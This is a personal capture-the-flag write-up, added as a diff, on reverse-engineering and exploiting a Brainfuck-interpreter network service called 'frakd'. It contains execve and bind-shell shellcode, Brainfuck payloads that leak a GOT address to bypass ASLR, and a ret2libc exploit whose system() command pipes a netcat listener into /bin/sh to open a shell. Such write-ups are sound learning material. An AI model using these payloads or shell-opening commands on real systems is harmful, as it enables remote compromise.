@@ -1,0 +1,685 @@
+That's a long filename so I did mv frakd<tab> frakd
+
+Ran objdump -M intel -d frakd.
+
+In the plt section, I'm seeing recv, memset, listen, free, accept, etc functions, so I guess those are included.
+
+There's a lot of socket-related stuff so this needs to connect to something somehow. Not sure what it does once that's happened.
+
+I get the feeling that everything in the .text section is executable code without headers.
+
+I'll try to RE some of these functions.
+
+objdump -M intel -j .text -d frakd >> frakdump
+
+**I actually decided to try and figure out the purpose of everything so I could label all the functions with a name but that unsurprisingly didn't work out.**
+
+**Here I decided to try and figure out where main was. I believe some __libc_start_main stuff was at 0x80487ac.**
+
+Ran gdb with the following config:
+set disassembly-flavor intel
+file frakd
+b *0x80487ac
+
+Program appears to enter main at 0x08048f90 (determined by stepping through __libc_start_main@plt)
+
+I was worried for a while because I saw a bunch of the calls in the objdump were labeled as exit@plt and err@plt, but googling them resulted in me finding an explanation that they're just calling a function in the same file as exit and err.
+
+To check myself on where I thought main was, though, I kept following through __libc_start_main@plt and found multiple entry points into the rest of the program.
+
+To try and find more information **I was still feeling pretty lost** I started going through the objdump output again, and found a call to getpwnam. **I kind of locked onto it because I figured it might result in me getting a password**. There was only one in the entire file, and the function containing that call is never reached when I try to run it.
+
+The function containing that call is at 0x8048a6e.
+
+So, I figure I'm supposed to do something about that. Backtracking brought me to a different function which called 8048a6e.
+
+That function is at 0x80489d8. That function IS reached in normal execution. So I'm going to need to pass some kind of logic here.
+
+I was able to figure out that the accept call is equivalent to accept(3,0,0);
+
+I now have come back after learning some stuff about socket programming and I'm going to lay out the flow of socket stuff.
+
+Function start: 0x8048884
+signal happens at 0x80488d3
+socket happens at 0x8048908
+setsockopt happens at 0x804894f
+bind happens at 0x8048989
+listen happens at 0x80489b5
+
+Function start: 0x80489d8
+accept happens at 0x80489fe
+fork happens at 0x8048a0c
+close happens at 0x8048a41
+
+So those are the important functions. It looks like accept() is the one that's hanging which kinda makes sense now.
+Oh man is this gonna fork bomb me I can't tell I hope not **it didn't :P**
+
+So anyway I go back to the socket call. Looks like socket(2,1,6) and the internet isn't doing a good job at telling me what these integers mean so I take a look in /usr/includes/sys/socket.h which points me at /usr/includes/bits/socket.h
+First parameter 2 ends up being: AF_INET
+Second parameter 1 is: SOCK_STREAM
+Third parameter 6 is: PF_NETROM ( ????? )
+
+**The reason I was going for this information was because I was used to SSHing to challenges from over the wire and WCSC wargames. Don't know why I didn't look for a port first.**
+
+So I have the parameters for the socket function.
+
+At this point I step away from it for a while. When I came back, I figured out how to connect to it in a silly way - writing a socket client in C with the same parameters.
+
+I was correct on the parameters. I had missed grabbing the port, though. By inspecting the stack immediately before a call to htons (which I had now seen would most likely contain a port) I noted it was 6969.
+
+So I finally had code to connect to the thing. **I still had never used netcat or telnet so this was all I knew**
+
+The response received on connect was:
+frakd: Failed to find user frakd: Success
+
+Uh, maybe if I add a user stuff will happen.
+
+I added the user. The new response on connect is:
+frakd: drop_privs failed!: Operation not permitted
+
+Tried to run again via gdb. That seemed to work.
+
+**At this point, I was still hoping to connect to a server somewhere running the program because I thought I was looking to get a password sent back to me**
+
+I googled drop_privs failed and found a writeup of a defcon challenge. The solution was running it as frakd.
+
+When running it as frakd, I found that the client would stay open despite the close() call in gdb. It took me a while to figure out that I needed to follow the child process and keep working from there.
+
+SOMEONE JUST TOLD ME ABOUT STRACE MAN THIS WOULD HAVE BEEN SO GREAT TO HAVE SEVERAL WEEKS AGO
+
+Looks like the arguments for socket were PF_INET, SOCK_STREAM, IPPROTO_TCP and you know what I'm just gonna paste those here
+
+socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
+setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+bind(3, {sa_family=AF_INET, sin_port=htons(6969), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
+listen(3, 20)                           = 0
+accept(3, 0, NULL)                      = 4
+
+So I have those. When running as frakd, I notice it gets caught on a read, so I modify the client program to start writing using scanf in a while loop->write
+
+Sending it "asdf" resulted in:
+[pid  5795] read(4, "a", 1)             = 1
+[pid  5795] read(4, "s", 1)             = 1
+[pid  5795] read(4, "d", 1)             = 1
+[pid  5795] read(4, "f", 1)             = 1
+
+I note that this followed a successful chdir("/home/frakd").
+
+After reading, it goes through some logic. I find that the value is getting stored in $ebp-0x11.
+
+It does a compare to 0x0a which is a newline, so I want to skip that.
+
+It jumps and does some movs before calling the next function. The input is now in edx.
+
+It does a comparison between eax and 0xff. eax last got set to ebp-0xc which was 0x15 in this case.
+
+It got incremented. Okay, so it won't jump unless it has 0xff characters of input.
+
+At the end of the function, it puts 0 in eax and returns
+
+Upon returning, there is a check to ensure the function returned with value 0. If it did, it closes and exits.
+
+If not, it puts a newline at what appears to be the end of the string. At least that's what I think it should be for.
+
+Set eax to $ebp+0x8 which is 0x4 in this case, and put it in $esp+0x4
+
+Maybe there'll be some way to buffer overflow from the reading function. It stops after 500 bytes of input. Does this thing use a flag byte to check?
+
+I know at this point it's reading 512 bytes based on the loop control.
+
+I can't find any way to extend the loop in the read function. It looks like it will always stop at 0x200 characters. Also, there's a jg in here that is going to get skipped unless the length is greater than 0.
+
+I'm probably focused on the wrong area at this point. I'm going to follow through the function to see if it does anything else with the input. It looks like it's just sticking a newline at the end and clearing it though.
+
+In the new function, the string is stored at 0xffffcd5c which is pointed to by ebp+0x8.
+
+There's a memset call on a buffer of 0x1000 bytes to fill it with null bytes.
+
+It starts by grabbing the first byte of the string. Based on what it gets, it jumps to different locations. It also appears to loop.
+
+   0x8048db3:	cmp    eax,0x3c
+   0x8048db6:	je     0x8048e04
+   0x8048db8:	cmp    eax,0x3c
+   0x8048dbb:	jg     0x8048de4
+   0x8048dbd:	cmp    eax,0x2d
+   0x8048dc0:	je     0x8048e20
+   0x8048dc2:	cmp    eax,0x2d
+   0x8048dc5:	jg     0x8048dda
+   0x8048dc7:	cmp    eax,0xa
+   0x8048dca:	je     0x8048f12
+   0x8048dd0:	cmp    eax,0x2b
+   0x8048dd3:	je     0x8048e0d
+   0x8048dd5:	jmp    0x8048f02
+
+0x3c is <
+0x2d is - OHHHHHH COME ON REALLY HERE I WAS LOOKING FOR SOME KIND OF LIKE CRAZY BUFFER OVERFLOW OR SOMETHING LIKE MAYBE IT WOULDN'T MEMSET ALL THE BYTES IF I MESSED WITH IT
+0x2b is + ON SECOND THOUGHT I PROBABLY SHOULD HAVE PICKED THIS UP FROM THE DESCRIPTION "THIS ONE'S GONNA FRAK YOUR BRAIN" BUT WHATEVER
+
+Anyway the jg following 0x3c is going to be for >
+The jg following 0x2d is going to be for .
+The jmp at the end is going to be for a fallthrough which decrements the number of bytes left. 
+
+Well now I need to figure out how to do this without looping in 512 bytes. **I missed that it also checked for square brackets. Whoops!**
+
+Actually, it keeps asking for input. Maybe I can go several rounds to create the instruction then finally overwrite the return address.
+
+The shellcode I want to execute is an execve("/bin/sh"). \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+The return address will be \x18\xbd\xff\xff
+
+In order, the important values: \x0b\x18\x2f\x31\x52\x58\x62\x68\x69\x6a\x6e\x73\x80\x89\x99\xbd\xc9\xcd\xe3\xff
+
+Making the shellcode, first I need to WHY DID IT TAKE ME UNTIL NOW TO FIND OUT ABOUT NC LOCALHOST 6969 TO CONNECT TO THIS WHAT IS WRONG WITH ME
+
+**The summary of what was happening here was I thought I could set memory behind ebp one or two bytes at a time, assuming that stuff would be there after the brainfuck interpreter closed, and slowly build shellcode using multiple read loops but I still had no idea how I'd return to it.**
+
++++++++++++ | \x0b
++++++++++++++ | \x18
++++++++++++++++++++++++ | \x2f
+++ | \x31
++++++++++++++++++++++++++++++++++ | \x52
+++++++ | \x58
+++++++++++ | \x62
+++++++ | \x68
++ | \x69
++ | \x6a
+++++ | \x6e
++++++ | \x73
++++++++++++++ | \x80
++++++++++ | \x89
+++++++++++++++++ | \x99
+++++++++++++++++++++++++++++++++++++ | \xbd
+++++++++++++ | \xc9
+++++ | \xcd
+++++++++++++++++++++++ | \xe3
+++++++++++++++++++++++++++++ | \xff
+
+Plugging this into a brainfuck interpreter with debug allowed me to check that the total number of +s added up to 0xff.
+Next is adding the pointer moves and putchars.
+
+\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80 starts at position 0.
+\x18\xbd\xff\xff starts at 
+
++++++++++++ | \x0b
++++++++++++++ | \x18
++++++++++++++++++++++++ | \x2f
+++ | \x31
++++++++++++++++++++++++++++++++++ | \x52
+++++++ | \x58
+++++++++++ | \x62
+++++++ | \x68
++ | \x69
++ | \x6a
+++++ | \x6e
++++++ | \x73
++++++++++++++ | \x80
++++++++++ | \x89
+++++++++++++++++ | \x99
+++++++++++++++++++++++++++++++++++++ | \xbd
+++++++++++++ | \xc9
+++++ | \xcd
+++++++++++++++++++++++ | \xe3
+++++++++++++++++++++++++++++ | \xff
+
+Oh hey there's a loop option in there I didn't think the brackets would be allowed given the compares didn't offer that possibility but they did I guess I just missed that comparison should have followed through and checked all the options whatever now that I have this I can overwrite a return address and write shellcode in one go!
+
+Well I'm going to need to use a shellbind code but anyway I ran into another problem which is I need to figure out how to get to the return address
+
+I notice that the socket identifier is right next to the return address and it's 0x4 which makes this sort of easy. Hopefully. As long as there's no 0x4 anywhere else.
+
+Or, maybe I could latch onto an 0x2 from the 0x2b000002. I'll try that.
+
+Loop:
+--[++>--]
+
+The first value is set to -2 and reset to 0 after the loop starts. It will then continue until it comes across an 0x2 somewhere
+
+Testing by flagging:
+
+--[++>--]+++
+
+I thought I wasn't getting anything, but it turned out I was able to successfully latch onto it. So now I know what I can do to handle this once I get the shellcode.
+
+\x31\xc0\x50\x68\x74\x63\x61\x74\x68\x6e\x2f"
+            "\x6e\x65\x68\x72\x2f\x62\x69\x68\x2f\x2f\x75"
+            "\x73\x89\xe3\x50\x68\x36\x36\x36\x36\x68\x2d"
+            "\x6c\x74\x70\x89\xe2\x50\x68\x6e\x2f\x73\x68"
+            "\x68\x2f\x2f\x62\x69\x66\x68\x2d\x65\x89\xe1"
+            "\x50\x51\x52\x53\x89\xe6\xb0\x0b\x89\xf1\x31"
+            "\xd2\xcd\x80
+
+\x31\xc0\x50\x68\x74\x63\x61\x74\x68\x6e\x2f\x6e\x65\x68\x72\x2f\x62\x69\x68\x2f\x2f\x75\x73\x89\xe3\x50\x68\x36\x36\x36\x36\x68\x2d\x6c\x74\x70\x89\xe2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x66\x68\x2d\x65\x89\xe1\x50\x51\x52\x53\x89\xe6\xb0\x0b\x89\xf1\x31\xd2\xcd\x80
+
+Somehow I need to write all this in the buffer in 512 bytes.
+
+Nevermind. I guess I can't do that. I get a segfault if I return to the stack anyway.
+
+GAH I CAN CHANGE THE RETURN ADDRESS TO WHATEVER I WANT AND I DON'T KNOW WHAT TO DO WITH THIS
+
+After lots of toying I came up with this solution which would overwrite the return address with libc system() and the string pointer that accompanies it with the address of the "nc -l 8080 | /bin/sh | nc localhost 8081". I had to pipe input into bin/sh using netcat but it wouldn't send output back that way so I had it do a connect back to me.
+
+--[++>--]++ >>>>>>>>>>>>>>>> >>>>>>>>>>>>>>>> >>>>>>>> -------- --------- < ---- ---------------- ------------ < + ++++++++++++++++ ++++++++++++++++ ++++++++++++++++ +++ < + ++++++++++++++++ ++++++++++++++++ ++++++++++++++++ ++++++ >>>>[-]>[-]>+>+>>>> - < - < ---------------- ---------------- ---------------- -- < ---------------- -------------nc -l 8080 | /bin/sh | nc localhost 8081
+
+Revisitation on 12/15?/2014:
+
+My goal now is to use send to get the thing to leak information back at me.
+
+Generalized stack stuff:
+
+[esp]
+---
+stuff
+---
+[ebp]
+---
+return address
+
+|
+| mov DWORD PTR[esp], arg1
+V
+
+arg1 [esp]
+---
+stuff
+---
+[ebp]
+---
+return address
+
+|
+| call (and then some stuff)
+V
+
+[esp]
+---
+stuff
+---
+saved ebp [ebp]
+---
+return address
+---
+arg1
+
+|
+| leave: mov esp, ebp
+V
+
+.
+---
+stuff
+---
+saved ebp [ebp] [esp]
+---
+return address
+---
+arg1
+
+|
+| leave: pop ebp
+V
+
+.
+---
+stuff
+---
+saved ebp
+---
+old return address [esp]
+---
+arg1
+---
+stuff
+---
+[ebp] (from saved)
+---
+return address
+
+|
+| ret: add esp, 0x4
+V
+
+.
+---
+stuff
+---
+saved ebp
+---
+old return address
+---
+arg1 [esp]
+---
+stuff
+---
+[ebp]
+---
+return address
+
+ret: jmp esp+0x4
+
+arg2 would go between arg1 and stuff. The stack frame construction reserves room for arguments inside the frame.
+
+
+Now for what exists in the brainfuck interpreter
+
+[esp]
+---
+0x1000 bytes of brainfuck working space, initialized to 0
+---
+the brainfuck pointer (i.e. the pointer to inside the working space where we are)
+---
+pointer to the current instruction 
+---
+number of remaining instructions (initialized to 0x1000000)
+---
+boolean indicating whether we are in a loop
+---
+Some other loop-related variable
+---
+???
+---
+???
+---
+[ebp]
+---
+return address
+---
+instruction pointer (copied to stack above)
+---
+file descriptor for socket (only used for send)
+
+
+There's a leave-ret after this is all done. The way it ends:
+
+(old stack stuff)
+---
+old return address
+---
+instruction pointer [esp]
+---
+fd [esp+0x4]
+
+So what I need to do is overwrite it so that it looks like this:
+
+(old stack stuff)
+---
+return address = 0x8048e50 (send)
+---
+fd [esp]
+---
+arbitrary pointer to whatever data I want to see [esp+0x4]
+---
+length
+---
+0
+
+
+Before I make a judgment on length, I should probably figure out how useful the GOT is. If system is going to be at the same location relative to something mentioned in the GOT then I shouldn't need too much information
+
+On the other hand, if the GOT doesn't tell me where to find system, I pretty much need to leak everything in the 0xf7 range until I get what I want (some kind of indication of system).
+
+Here's what a GOT access looks like:
+
+=> 0x8048300 <printf@plt>: jmp    DWORD PTR ds:0x8049660
+   0x8048306 <printf@plt+6>:  push   0x0
+   0x804830b <printf@plt+11>: jmp    0x80482f0
+
+ds:0x8049660 is just a pointer to the data segment, and 0x8049660 contains the value 0x8048306.
+
+This means that really it's just jumping to +6.
+
+No idea why push 0x0 is there. Maybe an indicator of what the desired function is.
+
+Then you jump to something before the PLT:
+
+=> 0x80482f0:  push   DWORD PTR ds:0x8049658
+   0x80482f6:  jmp    DWORD PTR ds:0x804965c
+   0x80482fc:  add    BYTE PTR [eax],al
+   0x80482fe:  add    BYTE PTR [eax],al
+
+The first push is actually _GLOBAL_OFFSET_TABLE_+4 (containing 0xb7fff908)
+Then you jump to _GLOBAL_OFFSET_TABLE_+8 (containing 0xb7ff59b0)
+
+In this case, system is at 0xb7e9bc30
+If I can get GOT+4 (0xb7fff908)
+
+Then the difference between system and GOT+4 is 0x163CD8
+
+0xb75bdc30
+0xb7721908
+
+0x163cd8 again.
+
+Okay, so if I can leak 4 bytes at address 0x8049658 then I can call to system the same way I did a few months ago.
+
+New stack layout post-return:
+
+(old stack stuff)
+---
+return address = 0x08048e50 (send)
+---
+fd [esp]
+---
+0x08049658
+---
+4
+---
+0
+
+Thankfully I can let this whole thing die after it tells me what I want because it forks, cloning the address space.
+
+0x08048f79 is the default return address.
+
+The brainfuck program structure that will get me to the GOT is:
+
+
+--[++>--]++ (to get to the end of the buffer)
+>>>> (and so on, to get me to ebp+8)
+[-]>[-]>[-]>[-] (to zero out ebp+8)
+>>>>>>>>[-<<<<<<<<+>>>>>>] (move fd from ebp+c to ebp+8)
+<<< (and so on, to get me to the third byte of the return address)
+[->>>>>+>>>>+<<<<<<<<<<] (or something - loads the return address into ebp+0xc and also into ebp+0x14)
+>[->>>>>>>>>+>>>>>+<<<<<<<<<] (do the same thing for the fourth byte of the return address)
+>>>>>>>>>>> (advance to ebp+0x14)
+[-<<<<<+>>>>>>>] (load return address back into ebp+4)
+
+At this point, I've moved fd to ebp+8, and copied part of the return address into ebp+c. Now for some adjustments:
+
+<< (and so on, go back to return address lsb)
+--------------- (correct fourth byte to 0x50)
+> (go to third byte of return address)
+- (fix it to 0x8e (send))
+
+Return address done, fd done.
+
+>>>>> (go to GOT address, msb)
+++++++++(0x08)
+<++++(0x04)
+<+++++++(0x96)
+<------------------------ (0x58)
+
+>>>(go to ebp+0x10)
+[-]++++(set length to 4)
+>>>>(go to ebp+0x14)
+[-](set flags to 0)
+
+Is this too long? <--Nope.
+
+--[++>--]++ >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> [-]>[-]>[-]>[-] >[-<<<<+>>>>] <<<<<<<[->>>>>>>>>>>>+>>>>+<<<<<<<<<<<<<<] >[->>>>>>>>>>>>+>>>>+<<<<<<<<<<<<<<] >>>>>>>>>>>>>>[-<<<<<<<<<<+>>>>>>>>>>] >[-<<<<<<<<<<+>>>>>>>>>>] <<<<<<<<<<----------------------------------------- <- >>>>>> --------------------------------- >+++++++ >++++ >++++++++ > [-]+++ >>>> [-]
+
+______________________________________________
+
+Alright, time to refine the program. Below is the version that sends back 4 bytes.
+
+--[++>--]++
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+>>>>>>>>
+[-]>[-]>[-]>[-]>
+>>>>
+[-]>[-]>[-]>[-]>
+[-]>[-]>[-]>[-]
+<<<<<<<<<<<
+[-<<<<+>>>>]
+<<<<<<<<
+[->>>>>>>>+>>>>+<<<<<<<<<<<<]
+>
+[->>>>>>>>+>>>>+<<<<<<<<<<<<]
+>>>>>>>>>>>
+[-<<<<<<<<<<<<+>>>>>>>>>>>>]
+>
+[-<<<<<<<<<<<<+>>>>>>>>>>>>]
+<<<<<<<<<<<<<
+-----------------------------------------
+>
+-
+>>>>>>>
+---------------------------------
+>
++++++++
+>
+++++
+>
+++++++++
+>
+++++
+
+______________________________
+
+I'm stupid; the above program actually prints out the GOT where it was for ANOTHER program. The copied return address parts need to be adjusted from 0x08048f79 to 0x804aff8, not to 0x8049658. Corrected here:
+
+--[++>--]++
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+>>>>>>>>
+[-]>[-]>[-]>[-]>
+>>>>
+[-]>[-]>[-]>[-]>
+[-]>[-]>[-]>[-]
+<<<<<<<<<<<
+[-<<<<+>>>>]
+<<<<<<<<
+[->>>>>>>>+>>>>+<<<<<<<<<<<<]
+>
+[->>>>>>>>+>>>>+<<<<<<<<<<<<]
+>>>>>>>>>>>
+[-<<<<<<<<<<<<+>>>>>>>>>>>>]
+>
+[-<<<<<<<<<<<<+>>>>>>>>>>>>]
+<<<<<<<<<<<<<
+-----------------------------------------
+>
+-
+>>>>>>>
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+>
+++++++++++++++++++++++++++++++++
+>
+++++
+>
+++++++++
+>
+++++
+
+_______________________________________
+
+--[++>--]++>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[-]>[-]>[-]>[-]>>>>>[-]>[-]>[-]>[-]>[-]>[-]>[-]>[-]<<<<<<<<<<<[-<<<<+>>>>]<<<<<<<<[->>>>>>>>+>>>>+<<<<<<<<<<<<]>[->>>>>>>>+>>>>+<<<<<<<<<<<<]>>>>>>>>>>>[-<<<<<<<<<<<<+>>>>>>>>>>>>]>[-<<<<<<<<<<<<+>>>>>>>>>>>>]<<<<<<<<<<<<<----------------------------------------->->>>>>>>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++++>++++>++++++++>++++
+
+With the white space removed it fits!
+
+root@kali:~/Desktop/frakd# nc localhost 6969 > results.txt
+--[++>--]++>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[-]>[-]>[-]>[-]>>>>>[-]>[-]>[-]>[-]>[-]>[-]>[-]>[-]<<<<<<<<<<<[-<<<<+>>>>]<<<<<<<<[->>>>>>>>+>>>>+<<<<<<<<<<<<]>[->>>>>>>>+>>>>+<<<<<<<<<<<<]>>>>>>>>>>>[-<<<<<<<<<<<<+>>>>>>>>>>>>]>[-<<<<<<<<<<<<+>>>>>>>>>>>>]<<<<<<<<<<<<<----------------------------------------->->>>>>>>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++++>++++>++++++++>++++
+root@kali:~/Desktop/frakd# hexdump results.txt
+0000000 f908 b7ff                              
+0000004
+
+To confirm:
+
+(gdb) x/25i 0xb7fff908-0x163CD8
+   0xb7e9bc30 <system>: sub    esp,0xc
+   0xb7e9bc33 <system+3>:  mov    DWORD PTR [esp+0x4],esi
+   0xb7e9bc37 <system+7>:  mov    esi,DWORD PTR [esp+0x10]
+
+Okay, sweet. I now have a program to get the address of system.
+
+Now I can combine this with my solution from when ASLR was disabled!
+
+_______________________________
+
+Syscall string (nc -l 8080 | /bin/sh | nc localhost 8081)
+; (end syscall string)
+echo (basically comment out the rest)
++ (correct from -l)
+Get to end of buffer
+Go to return address
+Modify return address to desired system address
+Zero ebp+c
+Move ebp+8 to ebp+c
+
+P.S. I needed -p for my kali VM for some reason.
+
+
+nc -l -p 8080 | /bin/sh | nc localhost 8081;
+++
+--[++>--]++
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+>>>>
+?(ret lsb)
+>
+?
+>
+?
+>
+?(ret msb)
+
+___________________________________
+
+PROOF IN GDB
+
+root@kali:~/Desktop/frakd# nc localhost 6969 > results.txt
+--[++>--]++>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[-]>[-]>[-]>[-]>>>>>[-]>[-]>[-]>[-]>[-]>[-]>[-]>[-]<<<<<<<<<<<[-<<<<+>>>>]<<<<<<<<[->>>>>>>>+>>>>+<<<<<<<<<<<<]>[->>>>>>>>+>>>>+<<<<<<<<<<<<]>>>>>>>>>>>[-<<<<<<<<<<<<+>>>>>>>>>>>>]>[-<<<<<<<<<<<<+>>>>>>>>>>>>]<<<<<<<<<<<<<----------------------------------------->->>>>>>>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++++>++++>++++++++>++++
+root@kali:~/Desktop/frakd# hexdump results.txt
+0000000 f908 b7ff                              
+0000004
+
+
+0xb7fff908-0x163cd8=0xB7E9BC30
+
+
+nc -l -p 8080 | /bin/sh | nc localhost 8081;
+echo "
+++
+--[++>--]++
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+>>>>
+[-]
+++++++++++++++++++++++++++++++++++++++++++++++++
+>
+[-]
+--------------------------------------------------------------------
+>
+[-]
+-----------------------
+>
+[-]
+-------------------------------------------------------------------------
+>>>>>
+[-]
+<<<<
+[->>>>+<<<<]>
+[->>>>+<<<<]>
+[->>>>+<<<<]>
+[->>>>+<<<<]
+"
+
+________________________________
+
+SOLUTION
+
+root@kali:~/Desktop/frakd# nc localhost 6969 > results.txt
+--[++>--]++>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[-]>[-]>[-]>[-]>>>>>[-]>[-]>[-]>[-]>[-]>[-]>[-]>[-]<<<<<<<<<<<[-<<<<+>>>>]<<<<<<<<[->>>>>>>>+>>>>+<<<<<<<<<<<<]>[->>>>>>>>+>>>>+<<<<<<<<<<<<]>>>>>>>>>>>[-<<<<<<<<<<<<+>>>>>>>>>>>>]>[-<<<<<<<<<<<<+>>>>>>>>>>>>]<<<<<<<<<<<<<----------------------------------------->->>>>>>>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++++>++++>++++++++>++++
+root@kali:~/Desktop/frakd# hexdump results.txt
+0000000 d908 b77a                              
+0000004
+
+
+0xb77ad908-0x163cd8=0xB7649C30
+
+
+nc -l -p 8080 | /bin/sh | nc localhost 8081; echo "++--[++>--]++>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[-]++++++++++++++++++++++++++++++++++++++++++++++++>[-]---------------------------------------------------------------------------------------------------->[-]++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>[-]------------------------------------------------------------------------->>>>>[-]<<<<[->>>>+<<<<]>[->>>>+<<<<]>[->>>>+<<<<]>[->>>>+<<<<]"
